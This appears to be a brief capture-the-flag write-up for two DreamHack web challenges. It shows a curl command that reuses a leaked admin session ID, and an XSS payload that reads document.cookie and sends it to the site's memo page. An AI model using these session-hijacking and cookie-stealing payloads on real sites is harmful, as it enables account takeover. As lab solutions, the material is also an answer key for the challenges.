# Level 1 — DreamHack

The levels in in the most solved to least order

## session-basic

Visit `/admin` and get:

```json
{ "2d6e1ed24747725ac7500d87818ba675ecb58936f894f8875516dfb5c49ace5d": "admin" }
```

Make a curl request:

```bash
curl http://host8.dreamhack.games:8733 -b "sessionid=2d6e1ed24747725ac7500d87818ba675ecb58936f894f8875516dfb5c49ace5d"
```

## xss-1

Submit `<script>location.href="/memo?memo="+document.cookie</script>` in `/flag`, then visit `/memo` to get the flag.
